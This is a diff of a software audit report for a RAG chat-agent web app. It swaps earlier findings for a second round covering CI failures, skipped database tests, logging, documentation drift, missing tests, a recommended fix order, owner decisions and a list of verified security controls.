+- **Verify:** `workflow_dispatch` run succeeds and logs "Cleanup complete". Add a `db` test that `prune_expired_guests(ttl_hours=1)` removes an old guest and keeps a fresh one (may already exist).
 
-- `§3.1`: "FastMCP (`fastmcp ^2.0`)", "gemini-3.8-flash with cascading fallbacks", "llama-index-core ^0.12.0", "FastAPI ^0.141.1". The code uses a hand-rolled JSON-RPC server, `gemini-2.5-flash`/`-lite`, `llama-index-core>=0.14.25` and `fastapi>=0.115.0`.
-- `§0` and `ASI-07`: "Deterministic Simulator mode must be available at all times". It was deleted (`TODOs.md:102,130`).
-- `ASI-06`: HITL is required for mutating tools. HITL was removed; this is acceptable only because all tools are read-only, so say that.
-- `ASI-05`: references `report.md S-01`, which does not exist in the repo (this report replaces it; update the reference to "previous audit, removed sandbox").
-- `§1`: "Dual MCP server and client". There is no client.
+### R2-OPS-02 · Medium · CI is red on `master`
 
-**Fix:** Edit `AGENTs.md` to describe the code as it is. For each removed capability, write "Not implemented" and the condition for adding it.
+- **Where:** `pnpm format:check` fails on `apps/frontend/app/page.test.tsx`, `app/page.tsx`, `app/terms/page.tsx`, `components/app-header.tsx`, `vitest.config.mts` (they use double quotes / different formatting from the `vite.config.ts` formatter settings). `pnpm lint` has 6 warnings.
+- **Fix:** Run `pnpm format` (it is `vp fmt`) and commit only formatting changes in one commit **before** other frontend fixes (so later diffs are clean). Fix the 6 lint warnings: add `void` to the floating promises (`page.tsx` lines ~111 and ~145, `useChatHistory.ts` ~147), and stringify safely in `MarkdownRenderer.tsx` (`typeof x === 'string' ? x : ''`) and `api-client.test.ts`. Then change the CI lint step to `pnpm lint --deny-warnings` if the tool supports it (check `vp lint --help`).
+- **Verify:** `pnpm format:check` and `pnpm lint` exit 0 with no warnings.
 
-### DOC-03 · `ARCHITECTURE.md` describes FastMCP and other absent parts
+### R2-OPS-03 · Medium · CI skips every DB test unless a secret is present
 
-- `:134,543-549`: "FastMCP Sub-Application mounted via `app.mount('/api/mcp', mcp_app)`" and "`fastmcp run app/routes/mcp.py`". Neither exists.
-- Re-check the DDL in `§6.2` against `migrations/` and replace it with a pointer to the migration files (DRY: one schema source).
-- Update `§10` (OWASP) after SEC-01…SEC-13 land.
+- **Where:** `.github/workflows/ci.yml` (`TEST_DATABASE_URL: ${{ secrets.TEST_DATABASE_URL }}`), `tests/conftest.py`.
+- **Problem:** 20 tests (auth, tenancy, documents, MCP, migrations, hybrid SQL) are skipped locally and on every pull request from a fork (secrets are not passed to forks), yet the job is green. The SQL that carries the tenancy and quota guarantees is exactly what is not exercised.
+- **Fix:** Use a service container so no secret is needed:
 
-### DOC-04 · `README.md` and `DESIGN.md` drift
+    ```yaml
+    backend:
+        services:
+            postgres:
+                image: pgvector/pgvector:pg18
+                env: { POSTGRES_PASSWORD: postgres, POSTGRES_DB: nexus_test }
+                ports: ['5432:5432']
+                options: >-
+                    --health-cmd "pg_isready -U postgres" --health-interval 5s --health-timeout 5s --health-retries 10
+        steps:
+            ...
+            - run: uv run pytest -q
+              env:
+                  TEST_DATABASE_URL: postgresql://postgres:postgres@localhost:5432/nexus_test
+    ```
 
-- README `:14`: "MCP v2 server … and client" (no client; protocol `2024-11-05`). `:15`: "append-only tool audit logging" (convention only, SEC-13). `:31`: "cyber obsidian tokens" (the theme is light enterprise). `:89-93`: `pnpm dev` starts only the frontend; the backend needs `pnpm dev:be`.
-- `DESIGN.md §2.1` token block uses `--color-primary: #0a66c2`, while the front matter and `globals.css` use `#004ea1`. `§3` describes an icon rail, a topology map, TCP throughput charts and a service-mesh table that do not exist. The app is a 3-column chat. `§6` claims AAA (UX-02).
-- **Fix:** Rewrite `DESIGN.md §2.1` to quote `globals.css` exactly (or link to it), and replace `§3` with the real layout (header, workspace sidebar, chat canvas, observability panel, mobile tab bar).
+    Add a final step `uv run pytest -q -rs | tee out.txt; ! grep -q SKIPPED out.txt` (or `--strict-markers` plus a count assertion) so a silent skip fails the job. Update the README testing section.
 
-### DOC-05 · Knowledge-base data provenance
+- **Verify:** CI log shows 0 skipped tests and ≥139 passed.
 
-- **Where:** `knowledge_base/benchmarks/*.md`.
-- **Problem:** The files attribute figures to real third parties (Artificial Analysis, BenchLM, CursorBench, OpenRouter) with "Last Updated: September 2026", but give no per-table source URL or retrieval date and no trace of how the figures were collected (`TODOs.md:131` says live scraping was removed). If any figure is estimated or hand-entered, presenting it as the named source's data breaks the Honesty Rule.
-- **Fix:** For each table, add `Source URL` and `Retrieved: YYYY-MM-DD`. Mark any unverified or estimated values with an explicit "(estimate)". The verifier should spot-check five rows per file against the public source.
+### R2-OPS-04 · Low · CI hygiene
+
+- **Where:** `.github/workflows/ci.yml`.
+- **Problem:** Actions pinned by moving tags (`@v4`, `@v5`), no `permissions:` block (default token permissions), no `concurrency` (stale runs pile up), no dependency audit, no uv cache, and the frontend job builds `@nexusagent/contracts` although nothing consumes `dist` (R2-CLN-02).
+- **Fix:** Add top-level `permissions: { contents: read }` and `concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }`. Pin each `uses:` to a full commit SHA with the tag in a comment. Add `enable-cache: true` to `setup-uv`. Remove the contracts build step. Add a job `audit`: `pnpm audit --prod --audit-level=high` and `uv run --with pip-audit pip-audit --skip-editable` (working-directory `apps/backend`, after `uv sync --frozen`). Enable Dependabot via `.github/dependabot.yml` for `npm`, `pip`/`uv` and `github-actions`, weekly.
+- **Verify:** Workflow validates (`gh workflow view`/a pushed run); audit job passes after R2-SEC-08.
+
+### R2-OPS-05 · Low · Application logging is not configured
+
+- **Where:** `apps/backend/app/main.py` (no `logging.basicConfig`/`dictConfig`).
+- **Problem:** Uvicorn configures only its own loggers. The app's `nexusagent.*` loggers inherit the root level `WARNING`, so `logger.info(...)` calls (migrations applied, pruned rows, "Applied migrations") never appear, and warnings use the bare last-resort format with no timestamp.
+- **Fix:** Add `LOG_LEVEL: str = "INFO"` to `Settings`. In `main.py` call `logging.basicConfig(level=settings.LOG_LEVEL, format="%(asctime)s %(levelname)s %(name)s %(message)s")` once at import. Never log request bodies or tokens.
+- **Verify:** Test with `caplog` that an `INFO` record from `nexusagent.db.migrations` is captured when the level is `INFO`.
+
+### R2-DOC-01 · Low · Documentation drift
+
+- `.agents/specs/features.md` line 19: "pnpm + Turborepo monorepo" is checked `[x]` but `turbo.json` was removed in the latest commit (`vite+` replaced it). Reword to "pnpm workspace + Vite+ task runner".
+- `README.md` says "pnpm: `^10.x`" while `package.json` pins `pnpm@12.9.1`; `@types/node ^20` in `apps/frontend/package.json` while `engines.node >=24`. Align them (use `@types/node ^24`).
+- Test file `apps/backend/tests/test_security_hitl.py` is named after the removed HITL feature but tests secret scrubbing and guardrails. Rename to `test_security_guardrails.py` (and its module docstring).
+- `messages.reflection_summary` is a misnomer: it stores `{grounding, citations, mermaidDiagrams}` since the reflection step was removed. Either rename (new migration `ALTER TABLE messages RENAME COLUMN reflection_summary TO answer_meta;` plus code and contract changes) or add a comment in the schema. Optional.
+- `AGENTs.md` section 2 lists itself in its own index; remove that bullet. State the actual path (`.agents/specs/AGENTs.md`) in `README.md`.
+- Add to `architecture.md`: the three per-process states (R2-SEC-06), the body-size limits (R2-SEC-02), `TRUSTED_PROXY_HOPS` (R2-SEC-05), and that the MCP SSE transport follows spec `2024-11-05` (newer MCP revisions use Streamable HTTP; see **D6**).
+- **Verify:** `grep -rn "Turborepo" .` finds nothing outside `node_modules`; links in README resolve.
+
+### R2-TST-01 · Medium · Missing tests for the riskiest modules and for adversarial inputs
+
+- **Frontend modules with no test file:** `lib/auth-store.ts` (session, logout, quota persistence), `hooks/useChatHistory.ts` (cache, delete rollback, race), `components/chat-canvas.tsx`, `composer.tsx`, `workspace-sidebar.tsx`, `observability-panel.tsx`, `app-header.tsx`, `sign-in-dialog.tsx`. Add at least: auth-store (applySession, clearSession wipes chat caches, 401 callback), useChatHistory (delete failure restores the item, out-of-order selection), composer (Enter/Shift+Enter/limit), header (quota pill, `bucketCapacity = 0`).
+- **Backend:** besides the tests listed in each finding, add (a) an end-to-end test that a document uploaded by user A is invisible to user B in `/api/rag/search`, `/api/agent/stream` retrieval and `/api/documents/{id}/chunks/{chunk}` (tenancy), (b) a test that `GET /api/audit-logs`-style endpoints only return the caller's rows.
+- **Verify:** `pnpm test` and `pytest` counts increase; no test is skipped in CI (R2-OPS-03).
+
+### R2-TST-02 · Low · Deprecation warnings in the test run
+
+- `HTTP_413_REQUEST_ENTITY_TOO_LARGE` is deprecated (used twice in `routes/documents.py`). Use `status.HTTP_413_CONTENT_TOO_LARGE`. Update tests that assert on the constant if any.
+- `google.genai` emits `_UnionGenericAlias` deprecation under Python 3.14; ignore it in `pyproject.toml` with `filterwarnings = ["ignore:'_UnionGenericAlias' is deprecated:DeprecationWarning:google.genai"]` and revisit when the library is updated (R2-SEC-08 upgrades may remove it).
+- **Verify:** `uv run pytest -q` prints no warnings.
 
 ---
 
-## 7. Test-suite findings
+## 7. Notes on things I deliberately did **not** list
 
-### TST-01 · `test_migrations.py` reconnects the shared pool
-
-- **Where:** `apps/backend/tests/test_migrations.py:17-24`.
-- **Problem:** It calls `neon_db.connect()` while the session fixture already holds a pool (the first pool leaks), then `disconnect()`s, which sets `neon_db.pool = None` for every later db test in the session.
-- **Fix:** Remove the `connect()`/`disconnect()` calls and rely on the session fixture.
-
-### TST-02 · Tests depend on a live LLM
-
-- **Where:** `test_agent_dag.py:49-52`, `test_agent_stream.py:50`.
-- **Problem:** They assert `"## Architectural Analysis"` and a Mermaid block in a real Gemini answer, so the results are non-deterministic and cost money.
-- **Fix:** Mock `_get_llm_chain` to return a fixed response in these tests, and keep a separate opt-in `@pytest.mark.live_llm` smoke test.
-
-### TST-03 · Weak or wrong assertions
-
-- `test_main.py:58-68` sends the CORS preflight to `/health` (no such route) instead of `/api/health`.
-- `test_security_hitl.py:400-426` ends with `assert call_res is not None`, which proves nothing (deleted with CLN-04 anyway).
-
-### TST-04 · No CI
-
-- **Problem:** No `.github/workflows` exist, but `AGENTs.md §4` requires build, lint and test gates.
-- **Fix:** Add one workflow with two jobs:
-    - Backend: `uv sync`, `ruff check`, `ruff format --check`, `pytest -q`. db tests are skipped without `TEST_DATABASE_URL`; optionally use a Neon branch secret.
-    - Frontend: `pnpm install --frozen-lockfile`, `pnpm --filter @nexusagent/frontend typecheck lint test build`.
-
-### TST-05 · Missing regression tests
-
-Each `SEC-*`/`LOG-*` item above names its test. Also add:
-
-- an SSE parser test with `\r\n` line endings and multi-line `data:` fields. `useAgentStream.ts:145-151` keeps only the last `data:` line; fix by joining them with `\n` as the SSE spec requires;
-- a test that `MarkdownRenderer` never renders raw HTML from content.
+- JWT and user data in `localStorage` (rather than HttpOnly cookies) is an accepted trade-off: the CSP is nonce-based and the token expires in 24 h and is revocable. Moving to cookies would need a BFF or same-site cookie design, which is **D7**.
+- The regex scope classifier is a cost control, not a security boundary. That is documented in `AGENTs.md` already.
+- `docs_url`/`openapi_url` are disabled in production; `/api/health` hides the version in production. Both are correct.
 
 ---
 
 ## 8. Recommended fix order
 
-Each batch can ship on its own. Within a batch, follow the listed order.
+Do these in order, one commit each. Items in the same bullet are independent and can go in any order.
 
-1. **Stop the money leaks:** SEC-01 → SEC-02 → SEC-03 → LOG-09.
-2. **Data correctness (before re-seeding):** LOG-04 → LOG-07 → LOG-15, then run `scripts/seed_kb.py` once → LOG-08.
-3. **Remove dead weight (shrinks later diffs):** CLN-01 → CLN-02 + LOG-19 → CLN-03 → CLN-04 → CLN-06 → CLN-07 → CLN-08 → CLN-09 → CLN-10.
-4. **Agent honesty and chat correctness:** LOG-06 + CLN-05 → SEC-07 → LOG-01 → LOG-02 → LOG-03 → LOG-18 → LOG-05 → LOG-11 → LOG-12 → LOG-17.
-5. **Auth and remaining security:** SEC-04 → SEC-05 → SEC-06 → SEC-08 → SEC-09 → SEC-10 → SEC-11 → SEC-13 → SEC-14.
-6. **Features users hit:** LOG-13 → LOG-14 → LOG-10 → LOG-16.
-7. **UI/UX:** UX-01 → UX-02 → UX-03 → UX-04 → UX-05 → UX-06 → UX-07 … UX-12.
-8. **Contracts and tests:** CLN-11 → CLN-12 → TST-01 … TST-05.
-9. **Docs last, so they describe the final code:** SEC-12 → DOC-01 … DOC-05.
+1. **Unblock CI:** R2-OPS-02 (format and lint warnings).
+2. **Stop the bleeding (security, high):** R2-SEC-01, R2-SEC-02, R2-SEC-03, R2-LOG-01.
+3. **Dependencies:** R2-SEC-08, then R2-OPS-04 (adds the audit job).
+4. **Auth and abuse controls:** R2-SEC-04, R2-SEC-05, R2-SEC-06 (guard first; the DB option only after **D3**), R2-SEC-07 (+ R2-LOG-14 migration in a separate file).
+5. **Correctness:** R2-LOG-02, R2-LOG-03, R2-LOG-04, R2-LOG-05, R2-LOG-06, R2-LOG-07, R2-LOG-08 .. R2-LOG-13.
+6. **UX:** R2-UX-01, R2-UX-02, R2-UX-03, then R2-UX-04 .. R2-UX-09.
+7. **Hardening leftovers:** R2-SEC-09 .. R2-SEC-12.
+8. **Cleanup (after behaviour is stable):** R2-CLN-01, R2-CLN-02, R2-CLN-08, R2-CLN-09, R2-CLN-10, R2-CLN-05, R2-CLN-07, R2-CLN-04, then the larger refactors R2-CLN-03 and R2-CLN-06.
+9. **Ops, docs and tests:** R2-OPS-01, R2-OPS-03, R2-OPS-05, R2-DOC-01, R2-TST-01, R2-TST-02.
 
 ---
 
-## 9. Verified as correct (do not re-flag)
+## 9. Decisions needed from the owner (the fixer must not guess)
 
-These were checked and are fine. The verifier should not spend time on them unless a fix touches them.
+| ID  | Question                                                                                                                                                                                                                                                                                                 | Recommendation                                                                                                                                                                                                         |
+| --- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| D1  | **Keep or drop `llama-index-core`?** It is used only for `MarkdownNodeParser` (split by headers) in `rag/parser.py`, yet it pulls a large transitive tree (Pillow, NLTK, aiohttp, dnspython, ...), which is most of the backend CVE list (R2-SEC-08). `AGENTs.md` names LlamaIndex as part of the stack. | Replace with a ~40-line header splitter you own (the parser already post-splits large sections itself). Cuts the attack surface and install size. If you keep it, accept the audit noise and pin/upgrade aggressively. |
+| D2  | **Wire the refresh flow or delete it?** (R2-LOG-11)                                                                                                                                                                                                                                                      | Wire it (small change, removes the daily forced logout).                                                                                                                                                               |
+| D3  | **Single instance guaranteed, or make abuse counters stateless?** (R2-SEC-06)                                                                                                                                                                                                                            | If you stay on one Render/Fly instance, do only the `WEB_CONCURRENCY` guard. Otherwise do the DB table.                                                                                                                |
+| D4  | **Add a "search only this document" selector, or delete `documentId` plumbing?** The backend (`/agent/stream`, `/rag/search`) supports it; the UI never sends it.                                                                                                                                        | Delete the frontend plumbing now; keep the backend parameter until you decide.                                                                                                                                         |
+| D5  | **Do you want any of the `.agents` stub files filled in?** (R2-CLN-08)                                                                                                                                                                                                                                   | No. Delete them.                                                                                                                                                                                                       |
+| D6  | **MCP transport:** the SSE + `POST /messages` transport follows spec `2024-11-05`, which newer MCP revisions replace with Streamable HTTP. Do external clients (Claude Desktop, Cursor) you care about still work with it?                                                                               | Verify with the clients you target before the next release; no code change until then.                                                                                                                                 |
+| D7  | **Session storage:** keep the bearer token in `localStorage`, or move to an HttpOnly same-site cookie via a Next.js route handler?                                                                                                                                                                       | Keep as is for the demo; revisit if you add paid users.                                                                                                                                                                |
 
-- **SQL injection:** every query is parameterised. The f-strings in `search_chunks_dense`/`search_chunks_lexical` only build `$n` placeholder indices from fixed strings.
-- **Tenancy:** `require_document_access` checks owner-or-seeded. Dense and lexical search filter `is_seeded OR user_id = $n`. Every conversation query filters `user_id`. `create_conversation`'s conflict clause cannot hijack another user's conversation ID (the `WHERE` returns no row).
-- **JWT:** the algorithm is pinned (`algorithms=[HS256]`), the secret must be at least 32 characters outside dev/test, and `DEBUG` is refused in production. Role and guest status are read from the DB, not from token claims.
-- **XSS in model output:** `MarkdownRenderer` never uses `dangerouslySetInnerHTML`. Links are limited to `http(s)`. Mermaid uses `securityLevel: 'strict'` plus DOMPurify on the SVG.
-- **SSE framing:** payloads are `json.dumps` single lines, so newline injection into the event stream is not possible.
-- **Client IP:** `X-Forwarded-For` is ignored unless `TRUST_PROXY_HEADERS=true`.
-- **Gemini key:** sent in the `x-goog-api-key` header, not in the URL.
-- **Migrations:** applied once each under a Postgres advisory lock, tracked in `schema_migrations`.
-- **Delete confirmation** for chats, **Escape and focus trap** in the expanded Mermaid view, and the `aria-live` status region are implemented correctly.
+---
+
+## Appendix A. Verified-good controls (so nobody "fixes" them)
+
+- **SQL:** all values are bound parameters. The only f-strings in `neon.py` interpolate `$n` placeholder indexes and the constant `SELECT_COLUMNS`. No injection path found.
+- **Tenancy:** `require_document_access`, `delete_user_document` (`AND user_id = $2 AND is_seeded = FALSE`), `get_conversation_with_messages`, `delete_conversation`, `get_conversation_history`, `create_conversation` (`ON CONFLICT ... WHERE user_id = EXCLUDED.user_id`) and the audit-log reader all filter by the caller. MCP search passes no `user_id`, so it only searches seeded documents.
+- **Auth:** Google ID tokens are verified locally (RS256, audience, issuer, `exp`/`iat`/`sub` required, `email_verified`). Accounts are keyed on `sub`. JWTs carry `iss`/`aud`, and logout bumps `token_version`.
+- **Quota:** `consume_rate_limit` is one atomic statement; out-of-scope refusals are free; the stream endpoint validates input before charging.
+- **Prompt-injection controls:** untrusted-context delimiters with escaping, canary hold-back streaming (a leaked canary never reaches the client), secret scrubbing of documents and chunks, injection warnings surfaced to the UI.
+- **Frontend:** per-request CSP nonce in `proxy.ts`, no script `unsafe-inline`, Mermaid `securityLevel: 'strict'` plus DOMPurify before `dangerouslySetInnerHTML`, links restricted to `http(s)`, chat caches wiped on logout, no real secrets in 87 commits.
+- **Database:** append-only audit trigger with a transaction-local retention switch; `statement_cache_size=0` for the Neon pooler; migrations under an advisory lock.
+
+## Appendix B. How the key claims were measured
+
+- **ReDoS (R2-SEC-01):** imported `security_guardrails.py` in isolation and timed `scrub_sensitive_information` on 20/40/80 KB repeated adversarial strings (JWT 0.08/0.30/1.21 s, DB URI 0.68/2.54 s at 40/80 KB, private key 0.21/0.89 s). Growth ≈ 4x per doubling = quadratic. Candidate fixes were timed on 1 MB inputs (0.004 to 0.23 s).
+- **Body parsed before auth (R2-SEC-02):** a minimal FastAPI app with an `UploadFile` plus a failing auth dependency, `MultiPartParser.parse` monkeypatched to record order: result `401` with order `['body-parsed', 'auth']`.
+- **Dependencies (R2-SEC-08):** `pnpm audit --prod` (38 findings) and `pip-audit --skip-editable` against `apps/backend/.venv`.
+- **Gates:** `uv run pytest -q` (119 passed, 20 skipped), `ruff check`, `ruff format --check`, `tsc --noEmit`, `vp lint`, `vp fmt --check`.
